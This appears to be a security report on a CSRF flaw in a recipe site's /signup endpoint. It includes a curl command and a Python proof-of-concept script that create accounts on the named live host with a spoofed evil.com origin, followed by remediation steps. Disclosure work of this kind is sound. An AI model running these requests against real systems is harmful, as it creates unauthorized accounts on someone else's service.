# CSRF on Registration Endpoint - Missing Nonce Validation

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-07-14 08:34:16 UTC
**Target:** https://api.axross-recipe.com/signup
**Endpoint:** /signup
**Method:** POST
**CWE:** CWE-352
**CVSS:** 6.5

## Description

The registration endpoint at POST /signup does not validate the anti-CSRF nonce token. The /signup/nonce endpoint returns a UUID that is completely ignored by the server during registration. This allows cross-site request forgery attacks where an attacker can create accounts on behalf of victims by tricking them into visiting a malicious page.

## Impact

An attacker can create accounts on the platform without the victim's consent. This can lead to account confusion, where the attacker controls the email associated with a username the victim wanted. In combination with the race condition vulnerability, this could enable account takeover scenarios. The attack requires no user interaction beyond visiting a malicious webpage.

## Technical Analysis

The Rails API backend exposes a /signup/nonce endpoint that generates a UUID, presumably intended as a CSRF token. However, the /signup endpoint processes registration requests without verifying this nonce. Testing confirmed that registration succeeds with or without the nonce parameter, from any origin (including evil.com), and with both JSON and form-encoded content types. The server does not check the Origin or Referer headers, and there is no CSRF token validation in the request processing pipeline.

## Proof of Concept

1. Create an HTML page with an auto-submitting form targeting https://api.axross-recipe.com/signup
2. Include hidden fields for username, email, password, password_confirmation, and agreed_to_terms
3. When a victim visits this page, the form auto-submits and creates an account
4. The attacker controls the email address, so they receive any confirmation emails

The following curl command demonstrates the vulnerability:
curl -X POST https://api.axross-recipe.com/signup -H "Content-Type: application/json" -H "Origin: https://evil.com" -d '{"username":"victim","email":"attacker@evil.com","password":"Test123!","password_confirmation":"Test123!","agreed_to_terms":true}'

```
#!/usr/bin/env python3
"""CSRF PoC for Axross Recipe Registration"""
import requests
import time

TARGET = "https://api.axross-recipe.com/signup"
ts = int(time.time())

# Test 1: Without nonce, from evil origin
payload = {
    "username": f"csrf_poc_{ts}",
    "email": f"csrf_poc_{ts}@evil.com",
    "password": "TestPass123!",
    "password_confirmation": "TestPass123!",
    "agreed_to_terms": True
}
headers = {
    "Content-Type": "application/json",
    "Origin": "https://evil.com",
    "Referer": "https://evil.com/csrf_attack.html"
}

resp = requests.post(TARGET, json=payload, headers=headers)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")
print(f"CSRF successful: {'success' in resp.text}")

# Test 2: With form-encoded body (no preflight needed)
resp2 = requests.post(TARGET, data={
    "username": f"csrf_form_{ts}",
    "email": f"csrf_form_{ts}@evil.com",
    "password": "TestPass123!",
    "password_confirmation": "TestPass123!",
    "agreed_to_terms": "true"
}, headers={"Origin": "https://evil.com"})
print(f"Form CSRF Status: {resp2.status_code}")
print(f"Form CSRF Response: {resp2.text}")
print(f"Form CSRF successful: {'success' in resp2.text}")
```

## Remediation

1. Validate the nonce on the server side before processing registration requests. Reject any request where the nonce is missing, invalid, or already used.
2. Implement Origin/Referer header validation to ensure requests originate from trusted domains.
3. Use Rails' built-in CSRF protection with authenticity_token for all state-changing requests.
4. Consider implementing a proper CSRF token mechanism tied to the user's session.
5. Add SameSite=Strict or SameSite=Lax to session cookies as an additional layer of defense.
